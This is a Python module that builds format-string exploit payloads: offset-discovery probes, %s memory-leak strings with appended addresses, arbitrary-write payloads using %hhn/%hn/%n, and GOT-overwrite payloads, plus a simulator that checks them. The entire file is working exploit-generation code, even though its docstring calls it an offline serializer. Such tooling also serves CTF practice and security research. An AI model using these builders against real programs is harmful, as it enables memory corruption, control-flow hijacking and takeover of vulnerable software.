"""Deterministic positional-format-string and GOT-overwrite payload builders.

The module uses positional ``%N$`` conversions throughout, places pointer words
after the format directives, and returns exact offsets through ``PayloadBuild``.
It is an offline serializer only; it never sends a payload or probes a process.
"""
from __future__ import annotations

from bisect import bisect_left
import re
from typing import Iterable, Mapping

try:
    from .contract import BuildError, PayloadBuild, ensure_uint, reject_bad_bytes
except ImportError:  # pragma: no cover
    from contract import BuildError, PayloadBuild, ensure_uint, reject_bad_bytes


MAX_PROBE_SLOTS = 512
MAX_WRITES = 1024
MAX_FORMAT_BYTES = 4 * 1024 * 1024
MAX_PRINTED_CHARACTERS = 16 * 1024 * 1024


def _word_size(word_size: int) -> int:
    if word_size not in {4, 8}:
        raise BuildError("word_size must be 4 or 8")
    return word_size


def _slot(value: int, name: str) -> int:
    if isinstance(value, bool) or not isinstance(value, int) or not 1 <= value <= 65535:
        raise BuildError(f"{name} must be a positional argument in 1..65535")
    return value


def _clean_bytes(value: bytes, name: str, *, allow_nul: bool = False) -> bytes:
    if not isinstance(value, bytes):
        raise BuildError(f"{name} must be bytes")
    if not allow_nul and b"\x00" in value:
        raise BuildError(f"{name} cannot contain NUL before format directives")
    return value


def build_offset_probe(
    *,
    start: int = 1,
    stop: int = 40,
    marker: bytes = b"R5B!R5B!",
    separator: bytes = b"|",
    word_size: int = 8,
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Build a bounded marker plus ``%N$p`` offset-discovery probe."""

    word_size = _word_size(word_size)
    _slot(start, "start")
    _slot(stop, "stop")
    if stop < start or stop - start + 1 > MAX_PROBE_SLOTS:
        raise BuildError(f"probe must contain 1..{MAX_PROBE_SLOTS} slots")
    marker = _clean_bytes(marker, "marker")
    separator = _clean_bytes(separator, "separator")
    if not marker or not separator:
        raise BuildError("marker and separator cannot be empty")
    payload = bytearray(marker)
    placements: dict[str, int] = {"marker": 0}
    widths: dict[str, int] = {"marker": len(marker)}
    for index in range(start, stop + 1):
        directive = separator + f"%{index}$p".encode("ascii")
        placements[f"probe[{index}]"] = len(payload)
        widths[f"probe[{index}]"] = len(directive)
        payload += directive
    raw = bytes(payload)
    reject_bad_bytes(raw, bad_bytes)
    return PayloadBuild(
        raw,
        placements,
        widths,
        architecture="amd64" if word_size == 8 else "i386",
        strategy="fmt-positional-offset-probe",
        metadata={"marker_word": hex(int.from_bytes(marker[:word_size].ljust(word_size, b"\x00"), "little"))},
    )


def discover_marker_slot(
    output: bytes | str,
    *,
    marker: bytes = b"R5B!R5B!",
    word_size: int = 8,
    endian: str = "little",
    start: int = 1,
) -> int | None:
    """Recover a unique probe slot from captured text; never chooses ambiguity."""

    word_size = _word_size(word_size)
    if endian not in {"little", "big"}:
        raise BuildError("endian must be little or big")
    _slot(start, "start")
    marker = _clean_bytes(marker, "marker", allow_nul=True)
    needle = int.from_bytes(marker[:word_size].ljust(word_size, b"\x00"), endian)
    text = output.decode("ascii", "replace") if isinstance(output, bytes) else str(output)
    hits: list[int] = []
    for ordinal, match in enumerate(
        re.finditer(r"(?:^|\|)(0x[0-9a-fA-F]+|\(nil\))", text)
    ):
        slot = start + ordinal
        if slot > 65535:
            break
        token = match.group(1)
        if token != "(nil)" and int(token, 16) == needle:
            hits.append(slot)
    return hits[0] if len(hits) == 1 else None


def build_positional_leak(
    *,
    argument_index: int,
    conversion: str = "p",
    address: int | None = None,
    word_size: int = 8,
    prefix: bytes = b"",
    suffix: bytes = b"",
    max_bytes: int | None = None,
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Build ``%N$p`` or ``%N$s`` with an optional appended address word."""

    word_size = _word_size(word_size)
    _slot(argument_index, "argument_index")
    if conversion not in {"p", "s", "lx", "llx"}:
        raise BuildError("conversion must be p, s, lx, or llx")
    if address is not None and conversion != "s":
        raise BuildError("an appended address is meaningful only for %s dereference")
    prefix = _clean_bytes(prefix, "prefix")
    suffix = _clean_bytes(suffix, "suffix")
    if max_bytes is not None:
        if conversion != "s":
            raise BuildError("max_bytes precision applies only to %s")
        if (isinstance(max_bytes, bool) or not isinstance(max_bytes, int)
                or not 1 <= max_bytes <= 1_048_576):
            raise BuildError("max_bytes must be in 1..1048576")
    directive = (
        f"%{argument_index}$.{max_bytes}s" if max_bytes is not None
        else f"%{argument_index}${conversion}"
    ).encode("ascii")
    payload = bytearray(prefix + directive + suffix)
    placements = {"format": 0, "directive": len(prefix)}
    widths = {"format": len(payload), "directive": len(directive)}
    if address is not None:
        pad = (-len(payload)) % word_size
        if pad:
            placements["alignment"] = len(payload)
            widths["alignment"] = pad
            payload += b"P" * pad
        ensure_uint(address, word_size * 8, name="address")
        placements["address"] = len(payload)
        widths["address"] = word_size
        payload += address.to_bytes(word_size, "little")
        widths["format"] = placements["address"]
    raw = bytes(payload)
    reject_bad_bytes(raw, bad_bytes)
    return PayloadBuild(
        raw,
        placements,
        widths,
        architecture="amd64" if word_size == 8 else "i386",
        strategy="fmt-positional-leak",
        metadata={"conversion": conversion, "argument_index": str(argument_index)},
    )


def _decompose_writes(
    writes: Mapping[int, int | bytes],
    *,
    word_size: int,
    value_width: int,
    atom_size: int,
) -> dict[int, int]:
    if not isinstance(writes, Mapping) or not writes or len(writes) > MAX_WRITES:
        raise BuildError(f"writes must be a mapping with 1..{MAX_WRITES} entries")
    atoms: dict[int, int] = {}
    for address, value in writes.items():
        ensure_uint(address, word_size * 8, name="write address")
        if isinstance(value, bytes):
            raw = value
        else:
            if (isinstance(value, bool) or not isinstance(value, int)
                    or not 0 <= value < (1 << (value_width * 8))):
                raise BuildError(f"value at {address:#x} does not fit in {value_width} bytes")
            raw = value.to_bytes(value_width, "little")
        if not raw or len(raw) % atom_size:
            raise BuildError("each write value length must be a non-zero multiple of atom_size")
        for offset in range(0, len(raw), atom_size):
            atom_address = address + offset
            ensure_uint(atom_address + atom_size - 1, word_size * 8, name="write end address")
            atom_value = int.from_bytes(raw[offset:offset + atom_size], "little")
            old = atoms.get(atom_address)
            if old is not None and old != atom_value:
                raise BuildError(f"conflicting overlapping write at {atom_address:#x}")
            atoms[atom_address] = atom_value
    if len(atoms) > MAX_WRITES:
        raise BuildError(f"decomposed writes exceed {MAX_WRITES} atoms")
    return atoms


def _cyclic_order(items: list[tuple[int, int]], current: int) -> list[tuple[int, int]]:
    ordered = sorted(items, key=lambda item: (item[1], item[0]))
    values = [item[1] for item in ordered]
    split = bisect_left(values, current)
    return ordered[split:] + ordered[:split]


def build_fmt_writes(
    writes: Mapping[int, int | bytes],
    *,
    first_address_arg: int,
    word_size: int = 8,
    value_width: int | None = None,
    atom_size: int = 1,
    numbwritten: int = 0,
    pad_argument: int | None = None,
    prefix: bytes = b"",
    alignment_byte: bytes = b"P",
    max_printed: int = 1_000_000,
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Build a positional arbitrary-write payload using ``%hhn/%hn/%n``.

    Integer values are serialized little-endian over ``value_width`` bytes
    (pointer width by default).  Bytes values are written exactly.  Pointer words
    are appended after all directives so embedded NULs cannot truncate them.
    """

    word_size = _word_size(word_size)
    value_width = word_size if value_width is None else value_width
    if (isinstance(value_width, bool) or not isinstance(value_width, int)
            or not 1 <= value_width <= word_size):
        raise BuildError("value_width must be in 1..word_size")
    if isinstance(atom_size, bool) or atom_size not in {1, 2, 4} or atom_size > value_width:
        raise BuildError("atom_size must be 1, 2, or 4 and no larger than value_width")
    first_address_arg = _slot(first_address_arg, "first_address_arg")
    pad_argument = _slot(
        first_address_arg if pad_argument is None else pad_argument, "pad_argument"
    )
    if (isinstance(numbwritten, bool) or not isinstance(numbwritten, int)
            or not 0 <= numbwritten <= MAX_PRINTED_CHARACTERS):
        raise BuildError(f"numbwritten must be in 0..{MAX_PRINTED_CHARACTERS}")
    if (isinstance(max_printed, bool) or not isinstance(max_printed, int)
            or not 0 <= max_printed <= MAX_PRINTED_CHARACTERS):
        raise BuildError(f"max_printed must be in 0..{MAX_PRINTED_CHARACTERS}")
    prefix = _clean_bytes(prefix, "prefix")
    if not isinstance(alignment_byte, bytes) or len(alignment_byte) != 1 or alignment_byte == b"\x00":
        raise BuildError("alignment_byte must be one non-NUL byte")
    atoms = _decompose_writes(
        writes, word_size=word_size, value_width=value_width, atom_size=atom_size
    )
    modulus = 1 << (atom_size * 8)
    running = (numbwritten + len(prefix)) % modulus
    ordered = _cyclic_order(list(atoms.items()), running)
    highest_slot = first_address_arg + len(ordered) - 1
    if highest_slot > 65535:
        raise BuildError(
            f"positional argument {highest_slot} exceeds the 65535 limit"
        )
    suffix = {1: "hhn", 2: "hn", 4: "n"}[atom_size]
    payload = bytearray(prefix)
    placements: dict[str, int] = {"format": 0}
    widths: dict[str, int] = {}
    final_values: dict[int, int] = {}
    printed_padding = 0
    for index, (address, value) in enumerate(ordered):
        delta = (value - running) % modulus
        printed_padding += delta
        if len(prefix) + printed_padding > max_printed:
            raise BuildError(
                f"format would print at least {len(prefix) + printed_padding} characters; "
                f"cap is {max_printed}"
            )
        directive = b""
        if delta:
            directive += f"%{pad_argument}${delta}c".encode("ascii")
        directive += f"%{first_address_arg + index}${suffix}".encode("ascii")
        placements[f"write[{index}].directive"] = len(payload)
        widths[f"write[{index}].directive"] = len(directive)
        payload += directive
        running = value
        final_values[address] = value
    if len(payload) > MAX_FORMAT_BYTES:
        raise BuildError("format directives exceed bounded payload size")
    alignment = (-len(payload)) % word_size
    if alignment:
        placements["alignment"] = len(payload)
        widths["alignment"] = alignment
        payload += alignment_byte * alignment
    placements["address_table"] = len(payload)
    address_table_start = len(payload)
    for index, (address, _value) in enumerate(ordered):
        label = f"write[{index}].address"
        placements[label] = len(payload)
        widths[label] = word_size
        payload += address.to_bytes(word_size, "little")
    widths["format"] = address_table_start
    raw = bytes(payload)
    reject_bad_bytes(raw, bad_bytes)
    encoded_targets = ",".join(f"{address:#x}:{value:#x}" for address, value in sorted(final_values.items()))
    return PayloadBuild(
        raw,
        placements,
        widths,
        architecture="amd64" if word_size == 8 else "i386",
        strategy="fmt-positional-arbitrary-write",
        metadata={
            "atom_size": str(atom_size),
            "first_address_arg": str(first_address_arg),
            "numbwritten": str(numbwritten),
            "printed_padding": str(printed_padding),
            "targets": encoded_targets,
        },
    )


def build_fmt_got_overwrite(
    *,
    got_address: int,
    replacement_address: int,
    first_address_arg: int,
    word_size: int = 8,
    atom_size: int = 1,
    numbwritten: int = 0,
    partial_width: int | None = None,
    prefix: bytes = b"",
    max_printed: int = 1_000_000,
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Build a direct GOT-to-function overwrite using positional ``%N$`` writes."""

    effective_width = word_size if partial_width is None else partial_width
    result = build_fmt_writes(
        {got_address: replacement_address},
        first_address_arg=first_address_arg,
        word_size=word_size,
        value_width=effective_width,
        atom_size=atom_size,
        numbwritten=numbwritten,
        prefix=prefix,
        max_printed=max_printed,
        bad_bytes=bad_bytes,
    )
    return PayloadBuild(
        result.payload,
        result.placements,
        result.widths,
        architecture=result.architecture,
        strategy="format-string-to-got",
        metadata={
            **dict(result.metadata),
            "got_address": hex(got_address),
            "replacement_address": hex(replacement_address),
            "partial_width": str(effective_width),
        },
    )


def simulate_positional_writes(
    build: PayloadBuild,
    *,
    numbwritten: int = 0,
) -> dict[int, int]:
    """Pure test oracle for payloads emitted by :func:`build_fmt_writes`."""

    if build.strategy not in {"fmt-positional-arbitrary-write", "format-string-to-got"}:
        raise BuildError("unsupported build strategy for simulator")
    try:
        atom_size = int(build.metadata["atom_size"])
        first_arg = int(build.metadata["first_address_arg"])
        format_end = build.placements["address_table"]
    except (KeyError, ValueError) as exc:
        raise BuildError("build is missing required simulator metadata") from exc
    text = build.payload[:format_end].decode("latin-1")
    count = numbwritten
    memory: dict[int, int] = {}
    token = re.compile(r"%(\d+)\$(?:(\d+)c|(hhn|hn|n))")
    cursor = 0
    for match in token.finditer(text):
        count += len(text[cursor:match.start()])
        position = int(match.group(1))
        if match.group(2) is not None:
            count += int(match.group(2))
        else:
            index = position - first_arg
            label = f"write[{index}].address"
            if label not in build.placements:
                raise BuildError("format references an address outside its table")
            start = build.placements[label]
            address = int.from_bytes(build.payload[start:start + (8 if build.architecture == "amd64" else 4)], "little")
            width = {"hhn": 1, "hn": 2, "n": 4}[match.group(3)]
            memory[address] = count % (1 << (width * 8))
        cursor = match.end()
    return memory

